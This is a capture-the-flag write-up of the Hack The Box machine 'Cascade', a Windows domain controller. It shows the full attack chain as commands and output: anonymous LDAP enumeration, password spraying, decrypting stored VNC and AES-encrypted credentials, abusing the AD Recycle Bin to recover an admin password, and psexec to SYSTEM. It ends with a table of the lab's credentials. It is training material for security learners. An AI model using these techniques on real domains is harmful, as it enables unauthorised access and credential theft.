# Cascade
>Author : Xyan1d3
>Date : 20th June 2021
>IP : 10.10.10.182
>OS : Windows Active Directory
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jul 19 23:42:56 2021 as: nmap -sC -sV -v -oN nmap/cascade 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.066s latency).
Not shown: 987 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-19 18:13:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-19T18:14:08
|_  start_date: 2021-07-19T18:05:45
```

## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec smb 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
```

## LDAP Enumeration with `windapsearch`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # /opt/windapsearch/windapsearch.py -d cascade.local --dc-ip 10.10.10.182 -U --full
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.182
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=cascade,DC=local
[+] Attempting bind                 
[+]     ...success! Binded as:
[+]      None
[+] Enumerating all AD users
[+]     Found 15 users: 


objectClass: top              
objectClass: person           
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson      
givenName: Ryan    
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4          
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610                  
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010           
name: Ryan Thompson           
objectGUID: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0                     
codePage: 0  
countryCode: 0            
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251          
primaryGroupID: 513                     
objectSid: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807     
logonCount: 2                           
sAMAccountName: r.thompson            
sAMAccountType: 805306368                       
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z        
dSCorePropagationData: 20200119174753.0Z        
dSCorePropagationData: 20200119174719.0Z        
dSCorePropagationData: 20200119174508.0Z        
dSCorePropagationData: 16010101000000.0Z        
lastLogonTimestamp: 132294360317419816          
msDS-SupportedEncryptionTypes: 0                
cascadeLegacyPwd: clk0bjVldmE=
```

We see that we have a `cascadeLegacyPwd` which contains a password `base64` encoded.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # echo "clk0bjVldmE=" |base64 -d;echo
rY4n5eva
```

We could try to spray the credentials of the `username` list.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec smb 10.10.10.182 -u users.lst -p pass.lst --continue-on-success
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

We try to list the `SMB` shares.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec5.1.1 smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/IT/Temp/s.smith]
└──╼ # ls                                
'VNC Install.reg'                      
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/IT/Temp/s.smith]
└──╼ # cat VNC\ Install.reg         
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]                       

*** SNIP ***

"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

*** SNIP ***
```

We could use this data to decrypt the password : https://github.com/frizb/PasswordDecrypts
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

We see that the credential is valid against the user `s.smith`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec smb 10.10.10.182 -u users.lst -p sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec winrm 10.10.10.182 -u users.lst -p sT333ve2 
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\CascGuest:sT333ve2
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\arksvc:sT333ve2
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

We also see that we have `winrm` enabled on the user. So, We may do an `evil-winrm` to get a shell on the box.

# Initial FootHold as s.smith
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
```
![[Pasted image 20210720124208.png]]

## Getting the User Flag
```python
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> ls


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/19/2021   7:06 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk


*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
db922ff67590f24e9c3d79cd1cb8e8bc
```

# User Escalation to arksvc
We could start enumerating the shares available by the `s.smith` user and find out that we now have access to the `audit$` share.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec5.1.1 smb 10.10.10.182 -u s.smith -p sT333ve2 --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

We do an `smbclient` and find out some files.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # smbclient -U 's.smith' //10.10.10.182/audit$
Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 23:31:26 2020
  ..                                  D        0  Wed Jan 29 23:31:26 2020
  CascAudit.exe                      An    13312  Wed Jan 29 03:16:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 23:30:20 2020
  DB                                  D        0  Wed Jan 29 03:10:59 2020
  RunAudit.bat                        A       45  Wed Jan 29 04:59:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 12:08:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 12:08:38 2019
  x64                                 D        0  Mon Jan 27 03:55:27 2020
  x86                                 D        0  Mon Jan 27 03:55:27 2020

                13106687 blocks of size 4096. 8165759 blocks available
```

We could mount the share onto our box and take a look at it.
The `CascAudit.exe` is an `.Net` Binary.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/audit_s.smith]
└──╼ # ls
CascAudit.exe  CascCrypto.dll  DB  RunAudit.bat  System.Data.SQLite.dll  System.Data.SQLite.EF6.dll  x64  x86
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/audit_s.smith]
└──╼ # file CascAudit.exe 
CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/audit_s.smith]
└──╼ # cd DB/
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/audit_s.smith/DB]
└──╼ # ls
Audit.db
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/audit_s.smith/DB]
└──╼ # file Audit.db 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```

We also have `Audit.db` which is an `sqlite3` database file.
We dump the `sqlite3` database file with `.dump` and find out that we have a credential of the `arksvc` account.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade/smb/audit_s.smith/DB]
└──╼ # sqlite3 Audit.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('Ldap',2);
INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
COMMIT;
```
But, The problem is `BQO5l5Kj9MdErXx6Q6AGOw==` looks to be like a `base64` but, it is actually encrypted.
So, Looks like we have to decompile the binaries in order to get the decryption function.

We decompile the `CascCrypto.dll` and find out that it is using `AES-128-CBC` mode to encrypt the binary.
![[Pasted image 20210720131259.png]]
But, We don't have the key there. So, Maybe we need to check out the binary and find out where the funcition is being called.
![[Pasted image 20210720131500.png]]

We find out that the Key is : `c4scadek3y654321`.

We use `https://dotnetfiddle.net/` for doing our job and using the chunk of codes inside the binaries.
```C#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
					
public class Program
{
	public const string DefaultIV = "1tdyjCbY1Ix49842";
	public const int Keysize = 128;
	public static string DecryptString(string EncryptedString, string Key)
	{
		//Discarded unreachable code: IL_009e
		byte[] array = Convert.FromBase64String(EncryptedString);
		Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Mode = CipherMode.CBC;
		aes.Key = Encoding.UTF8.GetBytes(Key);
		using (MemoryStream stream = new MemoryStream(array))
		{
			using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
			{
				byte[] array2 = new byte[checked(array.Length - 1 + 1)];
				cryptoStream.Read(array2, 0, array2.Length);
				return Encoding.UTF8.GetString(array2);
			}
		}
	}
	public static void Main()
	{
		Console.WriteLine(DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==","c4scadek3y654321"));
	}
}
```

![[Pasted image 20210720132353.png]]

We get the password to be `w3lc0meFr31nd`.

Now, Let's Verify our credentials on the `arksvc` user and see if we can login.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

We could now use `evil-winrm` to get a shell on the box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
```
![[Pasted image 20210720132703.png]]

# Root Escalation
We do an `whoami /all` and find out that we are in the `AD Recycle Bin` group.

We could use the command mentioned in :https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin
`Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *`

To get the deleted items of the `Active Directory`.
On like combing through the huge data one lines sticks out.
![[Pasted image 20210720133254.png]]
Which is `cascadeLegacyPwd` which is set to : `YmFDVDNyMWFOMDBkbGVz` which is the password of the `TempAdmin` account.

We base64 decode the credentials and find out that it is : `baCT3r1aN00dles` :)

We also have a weird fact as the `Administrator` user is not showing up on `rpcclient enumdomusers`.
![[Pasted image 20210720133750.png]]

We could try out our credential on the `Adminsitrator`.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # crackmapexec smb 10.10.10.182 -u users.lst -p baCT3r1aN00dles
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```
We see that `crackmapexec` screams us with `Pwn3d!`.

Now, Its just a matter of `psexec.py` to get a shell on the box.
![[Pasted image 20210720134156.png]]
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/cascade]
└──╼ # psexec.py Administrator@10.10.10.182
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.182.....
[*] Found writable share ADMIN$
[*] Uploading file qPYHyGnB.exe
[*] Opening SVCManager on 10.10.10.182.....
[*] Creating service llWw on 10.10.10.182.....
[*] Starting service llWw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

## Getting the root Flag
```python
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 12D1-4B25

 Directory of C:\Users\Administrator\Desktop

02/04/2021  05:24 PM    <DIR>          .
02/04/2021  05:24 PM    <DIR>          ..
07/19/2021  07:06 PM                34 root.txt
02/04/2021  05:24 PM           645,729 wds_current_setup.exe
02/04/2021  05:24 PM             1,031 WinDirStat.lnk
               3 File(s)        646,794 bytes
               2 Dir(s)  33,445,183,488 bytes free

C:\Users\Administrator\Desktop>type root.txt
b858b2db4d3334bcee0594424ae03135
```
# Credentials
|Username|Password|
|--|--|
|r.thompson|rY4n5eva|
|s.smith|sT333ve2|
|arksvc|w3lc0meFr31nd|
|Administrator|baCT3r1aN00dles|